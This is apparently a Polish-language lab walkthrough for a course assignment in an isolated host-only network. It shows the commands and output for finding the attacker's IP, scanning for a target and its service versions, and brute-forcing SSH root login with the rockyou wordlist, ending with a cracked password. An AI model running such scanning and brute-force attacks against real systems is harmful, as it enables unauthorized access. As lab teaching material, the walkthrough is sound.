# Przewodnik rozwiązania zadań

## Podstawowa konfiguracja
- maszyna wirtualna z systemem kali
- maszyna wirtualna SDA\
Sieć izolowana typu host-only 

## Ustalić własny adres IP wraz z maską podsieci

**Skrypt**: [network_info_final.py](network_info_final.py) wywołany bez argumentów.

```console
kali@kali:~$ python network_info_final.py
Interfejs: eth0
IP: 192.168.56.100
Maska sieci: 255.255.255.0
---------------------------
```

**Opis działania**: Skrypt robi pętlę po wykrytych w systemie interfejsach i zwraca adres IP przypisany do aktualnie iterowanego interfejsu.\
### Rozwiązanie: IP: <span style="color: green">192.168.56.100</span>, maska: <span style="color: green">255.255.255.0</span>
___
## Na podstawie powyższych informacji przeskanować sieć i ustalić adres IP celu, otwarte porty oraz ustalić nazwy oprogramowania na tych portach wraz z ich numerami wersji..
**Skrypt**: [port_scanner_final.py](port_scanner_final.py) wywołany bez argumentów.

```console
kali@kali:~$ python port_scanner_final.py
########################################
# Skanuję sieć w poszukiwaniu hostów.  #
# Interfejs: eth0                      #
# Ip: 192.168.56.100                   #
# Pomijam siebie!                      #
########################################
---------------------
IP: 192.168.56.1
Nazwa hosta: 
Status: up
Protokoły ┐
          └ TCP ┐
                ┌ Port: 22, status: open
                └ OpenSSH 8.9p1 Ubuntu 3 Ubuntu Linux; protocol 2.0
                ┌ Port: 80, status: open
                └ Apache httpd 2.4.52 (Ubuntu)
                ┌ Port: 139, status: open
                └ Samba smbd 4.6.2 
                ┌ Port: 445, status: open
                └ Samba smbd 4.6.2 
                ┌ Port: 631, status: open
                └ CUPS 2.4 
                ┌ Port: 3306, status: open
                └ MySQL  unauthorized
---------------------
IP: 192.168.56.106
Nazwa hosta: 
Status: up
Protokoły ┐
          └ TCP ┐
                ┌ Port: 21, status: open
                └ vsftpd 3.0.5 
                ┌ Port: 22, status: open
                └ OpenSSH 8.9p1 Ubuntu 3 Ubuntu Linux; protocol 2.0
                ┌ Port: 80, status: open
                └ Apache httpd 2.4.52 (Ubuntu)

```
**Opis działania**: Skrypt korzysta z poprzednio opisanego skrytpu. Na podstawie otrzymanej listy interfejsów do robi pętlę po nich i wykonuje skanowanie hostów zgodnie z maską sieciewią. Domyślnie skrypt nie wyświetla wyników skanowania portów na własnym IP.\
**Uwaga!** Jeżeli wirtualne maszyny są ustawione w trybie sieci: host-only, nie jest zwracana nazwa hosta! W trybie bridged - nazwy hostów są rozwiązywane poprawnie.
### Rozwiązanie: Adres IP celu: <span style="color: green">192.168.56.106</span>, otwarte porty:
- #### 21 - vsftpd 3.0.5 
- #### 22 - OpenSSH 8.9p1
- #### 80 - Apache httpd 2.4.52
___

## Atak brute-force na dowolną usługę

W pierwszej kolejności przeprowadzono atak na port 22 i usługę SSH. Założono, że na atakowanej maszynie istnieje użytkownik 'root'. Słownik możliwych haseł: rockyou.txt\
**Skrypt**: [brute_force_ssh_final.py](brute_force_ssh_final.py) wywołany z argumentami:
- --host 192.168.100.56.106
- --user root
- --password /usr/share/wordlists/rockyou.txt
```console
kali@kali:~$ python brute_force_ssh_final.py --host 192.168.56.106 --user root --password /usr/share/wordlists/rockyou.txt
[!] Błędne dane logowania root:12345
[*] Przekroczono limit połączeń, ponawiam próbę root:123456789 z opóźnieniem...
[*] Przekroczono limit połączeń, ponawiam próbę root:123456789 z opóźnieniem...
[!] Błędne dane logowania root:123456789
[!] Błędne dane logowania root:password
................
[*] Przekroczono limit połączeń, ponawiam próbę root:666 z opóźnieniem...
[*] Przekroczono limit połączeń, ponawiam próbę root:666 z opóźnieniem...
[+] Określono dane dostępowe:
        Host: 192.168.56.106
        Użytkownik: root
        Hasło: 666

```